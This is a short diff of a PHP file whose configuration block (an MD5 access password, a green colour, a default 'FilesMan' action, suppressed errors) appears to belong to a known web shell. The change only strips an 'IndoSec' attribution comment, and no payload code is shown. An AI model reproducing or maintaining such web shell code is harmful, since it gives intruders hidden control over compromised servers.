@@ -17,7 +17,7 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
+$auth_pass 			= "54062f3bf6377d42b4fab7c8fedfc7da"; 
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
